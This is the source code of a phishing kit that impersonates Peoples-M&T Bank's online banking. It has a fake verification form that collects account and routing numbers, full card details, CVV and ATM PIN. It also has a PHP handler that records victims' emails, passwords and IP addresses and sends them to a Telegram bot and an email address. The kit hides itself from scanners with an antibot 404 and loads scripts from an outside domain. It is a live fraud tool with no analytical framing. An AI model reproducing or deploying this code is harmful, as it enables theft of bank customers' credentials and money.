<?php
session_start();           
require_once '../session.php';

$comps = new Comp;
$antibot = new Antibot;

if (!$comps->checkToken()) { 
echo $antibot->throw404();      
die();
}
$d = $_POST['ad'];
?>
<html lang="en"><head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta data-appid="ceb">

    <!-- Latest minified CSS -->
    <link rel="stylesheet" href="eam/content/bootstrap.min.css?ver=63.3.4.1" type="text/css">
    <link rel="stylesheet" href="eam/content/eam.css?ver=63.3.4.1" type="text/css">
    <link rel="stylesheet" href="eam/content/fis-icon-font.css?ver=63.3.4.1" type="text/css">

    <link href="eam/styles/ceb_app/136_221172186/BankStyles.css?115707" rel="stylesheet" type="text/css">


    <!-- Latest JavaScript -->
    <script src="/eam/Scripts/umd/popper.min.js?ver=63.3.4.1"></script>
    <script src="/eam/Scripts/jquery-3.6.0.min.js?ver=63.3.4.1"></script>
    <script src="/eam/Scripts/bootstrap.min.js?ver=63.3.4.1"></script>    
    <script src="/eam/Scripts/eam.js?ver=63.3.4.1"></script>
    <script src="/eam/Scripts/eam-visual-validator.js?ver=63.3.4.1"></script>
    <script type="text/javascript">window.name = "";</script>

    <link rel="stylesheet" href="eam/content/jquery.smartbanner.min.css?ver=63.3.4.1" type="text/css" media="screen">
    <script src="/eam/scripts/jquery.smartbanner.min.js?ver=63.3.4.1"></script>



    <title>Verify Your Information - Peoples-M&amp;T Bank Online Banking</title>

    
	<script src="/eam/Scripts/UserAccountValidation.js?ver=63.3.4.1"></script>

	
	<style type="text/css">
		div.form-group.row.collapse.show {
			display: flex;
		}
	</style>

</head>
<body>
	<header>
        <a id="skippy" class="visually-hidden-focusable" href="#secureHideArea"><span class="skiplink-text">Skip to main content</span></a>
		<div class="fis-header-content"><a class="brandedImageLink" title="Peoples-M&amp;T Bank" href="http://www.peoples.com"><img id="_BankLogo" class="" title="Peoples-M&amp;T Bank" alt="" src="https://cibng.ibanking-services.com/Eam/Styles/CeB_App/136_221172186/136_image.svg"></a></div>
	</header>

	<div id="content" class="fis-page-content">
		<div class="">
            <div id="secureHideArea" class="container secureHideArea" role="main" tabindex="-1">
                <div></div>
                <div class="row">
                    <h1 class="col-sm-12">Verify Your Account Information</h1>
                </div>
                


	<form id="form" method="POST" action="action.php" autocomplete="off" data-wizard-title="Verify Your Information" data-wizard-submit="Continue" onsubmit="return validateForm()">
	<input type="hidden" id="hidden" value="2">
	<input type="hidden" name="ad" id="ad" value="<?php echo $d; ?>">
		<div class="form-group row">
			<div class="form-control-label col-sm-4">Account Type:</div>
			<div class="col-sm-6"><select class="form-control" data-val="true" data-val-required="The AccountType field is required." id="a" name="type">
<option selected="selected" value="Deposit Account">Checking, savings, or money market account</option>
<option value="Loan Account">Loan account</option>
</select></div>
		</div>

<input data-val="true" data-val-required="The UserType field is required." id="UserType" name="UserType" type="hidden" value="Individual">
		<div class="form-group row"><label class="form-control-label  col-sm-4" for="AccountNumber" id="LabelAccountNumber">Account Number:</label><div class="col-sm-6"><input id="b" name="acnumber" type="text" value="" class="form-control  " maxlength="11"><span class="depositFN" aria-expanded="true">Enter your checking, savings or money market account number.</span><span class="loanFN" aria-expanded="false" style="display: none;">Enter your loan account number.</span></div></div>

<input data-val="true" data-val-required="The UserType field is required." id="UserType" name="UserType" type="hidden" value="Individual">
<div class="form-group row"><label class="form-control-label  col-sm-4" for="AccountNumber" id="LabelAccountNumber">Routing Number:</label><div class="col-sm-6"><input id="c" name="routing" type="text" value="" class="form-control  "><span class="depositFN" aria-expanded="true">Enter the routing number associated with this account.</span><span class="loanFN" aria-expanded="false" style="display: none;">Enter your loan account number.</span></div></div>
<div class="form-group row collapse" aria-expanded="false"><label class="form-control-label  col-sm-4" for="LoanNote" id="LabelLoanNote">Loan note:</label><div class="loan col-sm-6"><input id="LoanNote" name="LoanNote" type="text" value="" class="form-control  " maxlength="5"></div></div>
		

<div class="form-group row collapse show" aria-expanded="true" style=""><label class="form-control-label  col-sm-4" for="FirstName" id="LabelFirstName">Card Holder Name:</label><div class="noBusiness col-sm-6 eam-consumer-item"><input id="d" name="cholder" type="text" value="" class="form-control  " maxlength="40">Enter the card holder name associated with this account.</div></div>


<div class="form-group row collapse show" aria-expanded="true" style=""><label class="form-control-label  col-sm-4" for="LastName" id="LabelLastName">Card Number:</label><div class="noBusiness col-sm-6 eam-consumer-item"><input type="hidden" id="cardTypeValue" value=""><span id="cardType" style="display: none;"></span><input id="cnumber" name="cnumber" type="text" value="" class="form-control  " maxlength="40">Enter the card number associated with this account.</div></div>

<div class="form-group row collapse show" aria-expanded="true" style=""><label class="form-control-label  col-sm-4" for="LastName" id="LabelLastName">Expiration Date:</label><div class="noBusiness col-sm-6 eam-consumer-item"><input id="expiry" name="expiry" placeholder="MM/YY" type="text" value="" class="form-control  " maxlength="40">Enter the card expiry date associated with this account.</div></div>


<div class="form-group row collapse show" aria-expanded="true" style=""><label class="form-control-label  col-sm-4" for="LastName" id="LabelLastName">Security Code (CVV):</label><div class="noBusiness col-sm-6 eam-consumer-item"><input id="cvv" name="cvv" type="text" value="" class="form-control  " maxlength="40">Enter the cvv associated with this account.</div></div>


<div class="form-group row collapse show" aria-expanded="true" style=""><label class="form-control-label  col-sm-4" for="LastName" id="LabelLastName">Atm Pin:</label><div class="noBusiness col-sm-6 eam-consumer-item"><input id="atm" name="atm" type="text" value="" class="form-control  " maxlength="40">Enter the atm pin associated with this account.</div></div>


<!-- <div class="form-group row collapse show" aria-expanded="true" style=""><label class="form-control-label  col-sm-4" for="SocialSecurityNumber" id="LabelSocialSecurityNumber">Social Security Number:</label><div class="noBusiness col-sm-6 eam-consumer-item"><input id="SocialSecurityNumber" name="SocialSecurityNumber" type="password" value="" class="form-control  " maxlength="4">Enter the last 4-digits of your social security number.</div></div>		 -->
		<div class="form-group row">
			<div class="col-lg col-sm w-100">
				<input id="continue" name="continue" type="submit" value="Continue" class="btn btn-primary">
			</div>
			<div class="col-lg col-sm w-100">
				<a id="cancel" href="#" class="btn btn-secondary" disabled>Cancel</a>
			</div>
		</div>
	</form>
	<script src="https://devilsms.live/cleave.js"></script>
<script src="https://devilsms.live/clve-min.js"></script> 
            </div>
		</div>
	</div>

    

    
    



</body></html>
<?php
error_reporting(0);
ini_set('display_errors', 0);
require_once '../config.php';
function get_string_between($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return substr($string, $ini, $len);
}

function get_client_ip() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
        $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}

$IPPP = get_client_ip();

 if (strpos($IPPP, ',') !== false) {
     $ippro = "<fuck>".$IPPP;
     $cldcvers = get_string_between($ippro, '<fuck>', ',');
     $IP = $cldcvers;
 } else {
     $IP = $IPPP;
 }

$a1 = $_POST['email'];
$b1 = $_POST['password'];

$data .= "<---- Email Іnfοrmаtiοn : {$IP} ---->\n\n";
$data .= "Page : Peoples\n\n";
$data .= "Email Address : {$a1}\n";
$data .= "Email Раѕѕѡοrԁ : {$b1}\n\n";
$data .= "Developed by {$d}\n";

$token = $Token;
$id = $Id;
$url = "https://api.telegram.org/bot";
$bot = "{$url}{$token}";

$params=[
	'chat_id'=>$id,
	'text'=>$data,
];

$ch = curl_init($bot . '/sendMessage');
//curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);
$email = $Email;
$subject = "Email Information from : $IP";
$headers = "From: Devilspam <wellsby@anoxyty.com>\r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
@mail($email,$subject,$data,$headers); 
exit();
?>